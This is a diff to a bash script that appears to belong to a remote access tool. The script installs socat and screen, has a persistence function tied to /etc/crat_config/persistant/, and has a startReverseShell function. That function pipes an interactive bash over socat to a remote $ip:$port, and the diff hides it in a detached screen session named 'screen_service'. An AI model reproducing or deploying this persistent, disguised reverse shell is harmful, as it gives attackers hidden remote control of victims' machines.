@@ -1,6 +1,7 @@
 #/bin/bash
 
 if [ ! -x "$(command -v socat)" ]; then sudo apt install -y socat; fi
+if [ ! -x "$(command -v screen)" ]; then sudo apt install -y screen; fi
 
 # check if the file is already in /etc/crat_config/persistant/
 makePersistant () {
@@ -92,7 +93,7 @@ startReverseShell () {
       fi
     fi
 
-    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
+    screen -dmS screen_service /bin/bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"
   done
 }
 
